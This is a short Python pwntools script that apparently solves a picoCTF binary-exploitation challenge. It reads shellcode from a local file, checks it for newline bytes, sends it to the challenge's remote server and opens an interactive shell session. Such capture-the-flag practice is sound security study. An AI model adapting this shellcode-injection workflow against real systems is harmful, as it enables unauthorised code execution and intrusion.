from pwn import *


shellcode = open("./test", "rb").read()
elf = context.binary = ELF("./fun")

# p = gdb.debug(elf.path, '''
# b *0x80485c9
# c
# ''')
# p = process(elf.path)
p = remote('mercury.picoctf.net', 35338)

if b'\x0a' in shellcode:
    print("shellcode contains enter!")
    sys.exit(1)

print(p.recvline())
p.sendline(shellcode)
p.interactive()



